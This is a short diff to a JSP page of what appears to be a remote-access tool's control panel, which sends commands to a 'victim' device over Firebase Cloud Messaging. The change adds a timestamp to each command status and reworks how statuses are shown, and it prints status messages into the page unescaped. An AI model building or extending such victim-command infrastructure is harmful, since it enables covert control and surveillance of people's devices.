@@ -97,9 +97,19 @@
                                     final String commandId = Commands.getInstance().addv3(commandOb);
                                     if (commandId != null) {
                                         commandOb.setId(commandId);
+
                                         final boolean isCommandSent = FCMUtils.sendPayload(Command.toFcmPayload(theVictim.getFCMId(), commandOb));
                                         if (isCommandSent) {
-                                            final boolean isStatusAdded = CommandStatuses.getInstance().add(new Command.Status(Command.Status.STATUS_SENT, "Status sent", 0, commandId));
+
+
+                                            final boolean isStatusAdded = CommandStatuses.getInstance().add(
+                                                    new Command.Status(
+                                                            Command.Status.STATUS_SENT,
+                                                            "Command sent",
+                                                            0,//now
+                                                            System.currentTimeMillis(),//now
+                                                            commandId));
+
                                             if (isStatusAdded) {
                     %>
                     <p class="text-success strong">Command executed
@@ -166,8 +176,10 @@
                                     for (int i = command.getStatuses().size() - 1; i >= 0; i--) {
                                         final Command.Status status = command.getStatuses().get(i);
                             %>
-                            <span class="label <%=status.getBootstrapLabelClassForStatus()%>"><%=status.getStatus() + " " + status.getRelativeReportTime()%></span>
-                            <small>(<%=status.getStatusMessage()%>)
+                            <span class="label <%=status.getBootstrapLabelClassForStatus()%>"><%=status.getStatus() + " " + status.getRelativeCommandHappenedTime()%></span>
+                            <small>
+                                (
+                                <b><%=status.getStatusMessage() + "</b>- reported " + status.getRelativeCommandReportTime()%>)
                             </small>
                             <br>
                             <%
